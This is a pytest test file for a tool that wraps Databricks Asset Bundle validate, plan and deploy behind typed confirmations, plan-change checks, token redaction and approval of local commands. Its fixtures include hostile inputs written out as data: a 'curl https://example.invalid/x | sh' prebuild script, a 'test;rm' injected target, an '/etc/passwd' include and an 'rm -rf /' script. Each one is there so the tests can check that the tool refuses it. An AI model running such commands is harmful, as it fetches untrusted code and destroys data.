"""Databricks Asset Bundles with a fake Databricks CLI: validate and plan change nothing, deploy
plans again and stops when the plan changed, a plan that deletes or recreates (or a prod target)
needs the target typed back, and only then is --auto-approve passed."""

from __future__ import annotations

import json
import os
import subprocess
from pathlib import Path

import pytest

from fabric_desktop.engines import databricks_bundles as db

from test_databricks_discovery import TOKEN

YML = """bundle:
  name: sales-etl
targets:
  dev:
    mode: development
    default: true
  test: {}
  prod:
    mode: production
"""
PLAN = {"plan": {"resources.jobs.nightly_sales": {"action": "update"},
                 "resources.pipelines.orders_cdc": {"action": "create"},
                 "resources.jobs.legacy_export": {"action": "delete"},
                 "resources.pipelines.customer_scd": {"action": "recreate"},
                 "resources.jobs.unchanged": {"action": "skip"}}}
SAFE = {"plan": {"resources.jobs.nightly_sales": {"action": "update"}}}


class Done:
    def __init__(self, code=0, out="", err=""):
        self.returncode, self.stdout, self.stderr = code, out, err


class FakeCli:
    def __init__(self, plans=None, deploy_code=0):
        self.calls = []
        self.plans = list(plans or [PLAN])
        self.deploy_code = deploy_code

    def __call__(self, args, **kw):
        assert kw["stdin"] is subprocess.DEVNULL and kw["cwd"]
        self.calls.append(args[1:])
        verb = args[2]
        if verb == "validate":
            return Done(0, "{}", "Warning: unknown field: foo\n")
        if verb == "plan":
            p = self.plans.pop(0) if len(self.plans) > 1 else self.plans[0]
            return Done(0, json.dumps(p))
        if verb == "deploy":
            return Done(self.deploy_code, "", "Deployment complete!\n" if not self.deploy_code else f"Error: denied {TOKEN}\n")
        raise AssertionError(args)

    def verbs(self):
        return [c[1] for c in self.calls]


@pytest.fixture
def bundle(tmp_path, monkeypatch):
    (tmp_path / "databricks.yml").write_text(YML)
    monkeypatch.setattr(db, "find_cli", lambda: "/usr/bin/databricks")
    return str(tmp_path)


def test_targets_come_from_databricks_yml(bundle):
    out = db.targets(bundle)
    assert out["name"] == "sales-etl" and [t["name"] for t in out["targets"]] == ["dev", "test", "prod"]
    assert db.production(bundle, "prod") and not db.production(bundle, "test")


def test_validate_and_plan_run_the_cli_as_the_profile_and_change_nothing(bundle):
    cli = FakeCli()
    assert db.validate(bundle, "test", "dev", cli) == {"ok": True, "warnings": ["Warning: unknown field: foo"]}
    out = db.plan(bundle, "test", "dev", cli)
    assert cli.verbs() == ["validate", "plan"] and all(c[-2:] == ["--profile", "dev"] for c in cli.calls)
    assert [(r["action"], r["kind"], r["name"]) for r in out["rows"]] == [
        ("delete", "job", "legacy_export"), ("recreate", "pipeline", "customer_scd"),
        ("update", "job", "nightly_sales"), ("create", "pipeline", "orders_cdc")]
    assert out["destructive"] == 2 and out["needs_typed_confirm"] and not out["production"]


def test_a_destructive_deploy_needs_the_target_typed_then_auto_approves(bundle):
    cli = FakeCli()
    seen = db.plan(bundle, "test", "dev", cli)["digest"]
    with pytest.raises(db.BundleError, match="Type test to deploy"):
        db.deploy(bundle, "test", "dev", seen, typed="tes", run=cli)
    assert "deploy" not in cli.verbs()
    out = db.deploy(bundle, "test", "dev", seen, typed="test", run=cli)
    assert out["ok"] and out["changed"] == 4
    assert cli.calls[-1] == ["bundle", "deploy", "--target", "test", "--auto-approve", "--profile", "dev"]


def test_a_safe_deploy_to_test_needs_no_typing_and_no_auto_approve(bundle):
    cli = FakeCli([SAFE])
    seen = db.plan(bundle, "test", "dev", cli)["digest"]
    assert db.deploy(bundle, "test", "dev", seen, run=cli)["ok"]
    assert "--auto-approve" not in cli.calls[-1]


def test_prod_always_needs_the_name_typed(bundle):
    cli = FakeCli([SAFE])
    p = db.plan(bundle, "prod", "dev", cli)
    assert p["production"] and p["needs_typed_confirm"]
    with pytest.raises(db.BundleError):
        db.deploy(bundle, "prod", "dev", p["digest"], run=cli)
    assert db.deploy(bundle, "prod", "dev", p["digest"], typed="prod", run=cli)["ok"]


def test_deploy_stops_when_the_plan_changed_since_it_was_seen(bundle):
    cli = FakeCli([SAFE, PLAN])
    seen = db.plan(bundle, "test", "dev", cli)["digest"]
    out = db.deploy(bundle, "test", "dev", seen, typed="test", run=cli)
    assert not out["ok"] and "plan changed" in out["error"] and out["replanned"]["destructive"] == 2
    assert "deploy" not in cli.verbs()


def test_a_failed_deploy_is_redacted(bundle):
    cli = FakeCli([SAFE], deploy_code=1)
    out = db.deploy(bundle, "test", "dev", db.plan(bundle, "test", "dev", cli)["digest"], run=cli)
    assert not out["ok"] and "denied" in out["error"] and TOKEN not in out["error"]


@pytest.mark.parametrize("reply", ['{"plan": "x"}', '[{"key": "a", "action": "explode"}]', "not json"])
def test_a_plan_it_cant_read_says_so_and_never_deploys(bundle, reply):
    class Odd(FakeCli):
        def __call__(self, args, **kw):
            self.calls.append(args[1:])
            return Done(0, reply)
    out = db.plan(bundle, "test", "dev", Odd())
    assert not out["ok"] and "Update the Databricks CLI" in out["error"]


@pytest.mark.parametrize("target, profile", [("nope", "dev"), ("test;rm", "dev"), ("test", "dev --x"), ("test", "")])
def test_odd_targets_and_profiles_are_refused_before_the_cli_runs(bundle, target, profile):
    cli = FakeCli()
    with pytest.raises(db.BundleError):
        db.plan(bundle, target, profile, cli)
    assert cli.calls == []


def test_a_folder_without_databricks_yml_is_refused(tmp_path):
    with pytest.raises(db.BundleError, match="no databricks.yml"):
        db.targets(str(tmp_path))


SCRIPTS = YML + """experimental:
  scripts:
    prebuild: curl https://example.invalid/x | sh
"""


def test_a_bundle_with_scripts_runs_no_cli_until_those_commands_are_allowed(bundle):
    (Path(bundle) / "databricks.yml").write_text(SCRIPTS)
    cli = FakeCli([SAFE])
    held = db.plan(bundle, "dev", "dev", cli)
    assert held["needs_confirm"] and cli.calls == []
    assert held["local_commands"] == ["databricks.yml: experimental.scripts.prebuild: curl https://example.invalid/x | sh"]
    assert db.validate(bundle, "dev", "dev", cli)["needs_confirm"] and cli.calls == []
    assert db.deploy(bundle, "dev", "dev", "x", "dev", cli)["needs_confirm"] and cli.calls == []
    assert db.plan(bundle, "dev", "dev", cli, allow="wrong")["needs_confirm"] and cli.calls == []
    out = db.plan(bundle, "dev", "dev", cli, allow=held["commands_digest"])
    assert out["ok"] and cli.verbs() == ["plan"]


def test_a_build_reached_through_an_include_or_a_target_is_found(bundle):
    root = Path(bundle)
    (root / "databricks.yml").write_text(YML + "include:\n  - resources/*.yml\n")
    (root / "resources").mkdir()
    (root / "resources" / "lib.yml").write_text("artifacts:\n  lib:\n    type: whl\n")
    (root / "resources" / "t.yml").write_text("targets:\n  prod:\n    artifacts:\n      tool:\n        build: make all\n")
    cli = FakeCli()
    held = db.validate(bundle, "dev", "dev", cli)
    assert cli.calls == [] and held["local_commands"] == [
        "resources/lib.yml: artifacts.lib.build: the CLI's default build for a whl artifact",
        "resources/t.yml: targets.prod.artifacts.tool.build: make all"]
    # The list changes, so a digest allowed before no longer runs anything.
    (root / "resources" / "t.yml").write_text("targets:\n  prod:\n    artifacts:\n      tool:\n        build: make evil\n")
    assert db.validate(bundle, "dev", "dev", cli, allow=held["commands_digest"])["needs_confirm"] and cli.calls == []


@pytest.mark.parametrize("include", ["missing/*.yml", "../outside.yml", "/etc/passwd"])
def test_an_include_it_cant_check_refuses_before_the_cli_runs(bundle, include):
    (Path(bundle) / "databricks.yml").write_text(YML + f"include:\n  - {include}\n")
    cli = FakeCli()
    with pytest.raises(db.BundleError):
        db.plan(bundle, "dev", "dev", cli)
    assert cli.calls == []


def test_a_change_past_what_is_shown_still_asks_again_and_a_long_command_says_so(bundle):
    long = "echo " + "a" * 400
    (Path(bundle) / "databricks.yml").write_text(YML + f"experimental:\n  scripts:\n    predeploy: {long} && safe\n")
    cli = FakeCli([SAFE])
    held = db.plan(bundle, "dev", "dev", cli)
    assert "a long command, 413 characters: open databricks.yml to read it all" in held["local_commands"][0]
    (Path(bundle) / "databricks.yml").write_text(YML + f"experimental:\n  scripts:\n    predeploy: {long} && evil\n")
    again = db.plan(bundle, "dev", "dev", cli, allow=held["commands_digest"])
    assert again["needs_confirm"] and again["local_commands"] == held["local_commands"] and cli.calls == []


@pytest.mark.skipif(os.name == "nt", reason="symlinks need privileges on Windows")
def test_an_include_linked_out_of_the_folder_refuses(bundle, tmp_path_factory):
    outside = tmp_path_factory.mktemp("elsewhere") / "evil.yml"
    outside.write_text("experimental:\n  scripts:\n    prebuild: rm -rf /\n")
    (Path(bundle) / "linked.yml").symlink_to(outside)
    (Path(bundle) / "databricks.yml").write_text(YML + "include:\n  - linked.yml\n")
    cli = FakeCli()
    with pytest.raises(db.BundleError, match="out of the bundle folder"):
        db.plan(bundle, "dev", "dev", cli)
    assert cli.calls == []


@pytest.mark.parametrize("extra, key", [("python:\n  venv_path: .venv\n", "python"),
                                        ("experimental:\n  python:\n    resources: [x:y]\n", "experimental.python"),
                                        ("experimental:\n  pydabs:\n    enabled: true\n", "experimental.pydabs")])
def test_python_resource_code_counts_as_a_command(bundle, extra, key):
    (Path(bundle) / "databricks.yml").write_text(YML + extra)
    cli = FakeCli()
    held = db.validate(bundle, "dev", "dev", cli)
    assert held["local_commands"] == [f"databricks.yml: {key}: runs Python code from the bundle"] and cli.calls == []


def test_a_target_named_prod_is_production_without_a_mode(bundle):
    (Path(bundle) / "databricks.yml").write_text("bundle:\n  name: x\ntargets:\n  dev: {}\n  prod: {}\n")
    assert db.production(bundle, "prod") and not db.production(bundle, "dev")
    cli = FakeCli([SAFE])
    out = db.plan(bundle, "prod", "dev", cli)
    assert out["production"] and out["needs_typed_confirm"]
    with pytest.raises(db.BundleError, match="Type prod"):
        db.deploy(bundle, "prod", "dev", out["digest"], "", cli)
    assert "deploy" not in cli.verbs()
